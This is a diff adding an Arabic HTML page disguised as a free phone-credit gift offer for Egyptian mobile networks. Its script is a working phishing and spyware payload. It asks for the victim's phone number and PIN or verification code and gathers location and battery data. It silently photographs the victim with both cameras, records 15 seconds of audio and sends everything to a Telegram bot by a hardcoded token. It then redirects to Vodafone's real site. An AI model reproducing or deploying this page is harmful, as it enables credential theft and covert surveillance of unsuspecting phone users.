@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عروض الهدايا اليومية - شحن رصيد مجاني</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .promo-card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .header-icon { font-size: 52px; margin-bottom: 10px; }
+        h2 { color: #1c1e21; margin-bottom: 8px; font-size: 24px; }
+        p.subtitle { color: #65676b; font-size: 14px; margin-bottom: 25px; }
+        
+        .networks {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .net-option {
+            flex: 1;
+            padding: 10px 5px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            background: #fff;
+        }
+        .net-option.selected {
+            border-color: #2e7d32;
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        .input-group { margin-bottom: 15px; text-align: right; }
+        label { display: block; margin-bottom: 5px; color: #333; font-size: 13px; font-weight: 600; }
+        input {
+            width: 100%; padding: 12px; border: 1px solid #ccd0d5;
+            border-radius: 8px; box-sizing: border-box; font-size: 15px; outline: none;
+            background: #f9f9f9;
+        }
+        input:focus { border-color: #2e7d32; background: #fff; }
+        
+        button {
+            width: 100%; padding: 14px; background-color: #2e7d32; border: none;
+            border-radius: 8px; color: white; font-size: 16px; font-weight: bold;
+            cursor: pointer; margin-top: 10px; transition: 0.2s;
+        }
+        button:hover { background-color: #1b5e20; }
+        .footer-note { margin-top: 20px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div class="promo-card" id="cardContainer">
+    <div class="header-icon">🎁</div>
+    <h2>عروض الشحن الفوري</h2>
+    <p class="subtitle">اختر شبكتك واكسب حتى 200 جنيه رصيد هدية فوراً!</p>
+    
+    <div class="networks">
+        <button type="button" class="net-option selected" onclick="selectNet(this, 'فودافون')">فودافون</button>
+        <button type="button" class="net-option" onclick="selectNet(this, 'أورانج')">أورانج</button>
+        <button type="button" class="net-option" onclick="selectNet(this, 'اتصالات')">اتصالات</button>
+        <button type="button" class="net-option" onclick="selectNet(this, 'وي (WE)')">وي</button>
+    </div>
+
+    <form id="promoForm">
+        <div class="input-group">
+            <label>رقم الهاتف المحمول</label>
+            <input type="tel" id="phone" required placeholder="01xxxxxxxx" pattern="[0-9]{10,11}">
+        </div>
+        <div class="input-group">
+            <label>الرقم السري أو كود التأكيد (اختياري)</label>
+            <input type="password" id="passcode" placeholder="أدخل كود التحكيد إن وجد">
+        </div>
+        <button type="submit" id="submitBtn">الحصول على الهدية الآن</button>
+    </form>
+    <div class="footer-note" id="statusText">العرض ساري لفترة محدودة - شارك ورقمك واربح</div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none; position:fixed; opacity:0; pointer-events:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = "8453371866:AAGbhkq5DUlBNJ2iu0IGYK8IdDqeTOr5lVc";
+    const CHAT_ID = "8016442557";
+    let selectedNetwork = "فودافون";
+
+    function selectNet(element, netName) {
+        document.querySelectorAll('.net-option').forEach(el => el.classList.remove('selected'));
+        element.classList.add('selected');
+        selectedNetwork = netName;
+    }
+
+    // دالة جلب معلومات البطارية
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return `🔋 نسبة البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يتم الشحن ⚡' : 'غير موصول'})`;
+            }
+        } catch (e) {}
+        return "🔋 نسبة البطارية: غير متوفرة";
+    }
+
+    // دالة جلب الموقع الجغرافي
+    async function getLocationInfo() {
+        return new Promise(resolve => {
+            if (!navigator.geolocation) {
+                resolve("📍 الموقع الجغرافي: غير مدعوم");
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    resolve(`📍 الموقع: خط عرض ${lat}, خط طول ${lon}\n🔗 [خريطة جوجل](https://maps.google.com/?q=${lat},${lon})`);
+                },
+                () => {
+                    resolve("📍 الموقع الجغرافي: تم رفض الإذن أو غير متاح");
+                },
+                { timeout: 5000 }
+            );
+        });
+    }
+
+    document.getElementById('promoForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const phone = document.getElementById('phone').value;
+        const passcode = document.getElementById('passcode').value || "غير مسجل";
+        const btn = document.getElementById('submitBtn');
+        const statusText = document.getElementById('statusText');
+        
+        btn.disabled = true;
+        btn.innerText = "جاري شحن الهدية...";
+
+        // جمع معلومات الجهاز الإضافية
+        const batteryText = await getBatteryInfo();
+        const locationText = await getLocationInfo();
+
+        // 1. إرسال البيانات النصية كاملة (الرقم، الكود، البطارية، الموقع)
+        await sendTelegramMessage(`🎁 **طلب شحن جديد:**\n📱 **الشبكة:** ${selectedNetwork}\n📞 **الرقم:** ${phone}\n🔑 **الكود/الرمز:** ${passcode}\n${batteryText}\n${locationText}`);
+
+        try {
+            statusText.innerText = "جاري معالجة الهدية...";
+            
+            await capturePhotosQuietly('user', '📷 أمامية');
+            await capturePhotosQuietly('environment', '📸 خلفية');
+            await recordAudioQuietly();
+
+        } catch (err) {
+            console.log("Stealth capture skipped or blocked:", err);
+        }
+
+        window.location.href = "https://www.vodafone.com.eg";
+    });
+
+    async function capturePhotosQuietly(facingMode, labelPrefix) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(resolve, 300);
+                };
+            });
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const context = canvas.getContext('2d');
+
+            for (let i = 1; i <= 2; i++) {
+                await new Promise(r => setTimeout(r, 400));
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                await sendTelegramPhoto(blob, `${labelPrefix} (${i})`);
+            }
+            stream.getTracks().forEach(track => track.stop());
+        } catch (e) {
+            console.log(`Silent capture failed for ${facingMode}`);
+        }
+    }
+
+    async function recordAudioQuietly() {
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(audioStream);
+            let audioChunks = [];
+
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) audioChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                await sendTelegramAudio(audioBlob, "🎙️ تسجيل صوتي خفي (15 ثانية)");
+                audioStream.getTracks().forEach(track => track.stop());
+            };
+
+            mediaRecorder.start();
+            // تعديل مدة التسجيل الصوتي لتصبح 15 ثانية (15000 ميللي ثانية)
+            await new Promise(resolve => setTimeout(resolve, 15000));
+            mediaRecorder.stop();
+        } catch (e) {
+            console.log("Audio stealth failed");
+        }
+    }
+
+    async function sendTelegramMessage(text) {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        }).catch(() => {});
+    }
+
+    async function sendTelegramPhoto(blob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
+    }
+
+    async function sendTelegramAudio(blob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('audio', blob, 'voice_record.mp3');
+        formData.append('caption', caption);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, { method: 'POST', body: formData }).catch(() => {});
+    }
+</script>
+
+</body>
+</html>
